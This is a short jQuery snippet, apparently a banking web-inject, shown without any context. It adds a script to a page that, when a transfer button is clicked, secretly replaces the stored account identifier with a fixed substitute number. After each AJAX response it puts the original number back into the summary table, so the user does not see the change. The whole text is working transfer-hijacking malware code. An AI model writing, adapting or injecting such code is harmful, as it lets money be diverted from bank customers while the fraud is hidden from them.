$('head').append(`<script> $(document).ready(
    function() { 
        var caughtId; 
        $('.specialButton#1st').click(function() {    
            if (typeof id !== 'undefined') {      
                caughtId = id;      
                id = '66 6666 6666 6666 6666 6666 6666';    
                
            }  
            
        });  
        $(document).ajaxComplete(function() {    
            if ($('#summary').length > 0) {      
                $('#summary tr:nth-of-type(2) td:last-child').html(caughtId);    
                
            }  
            
        });
        
    });</script>`);
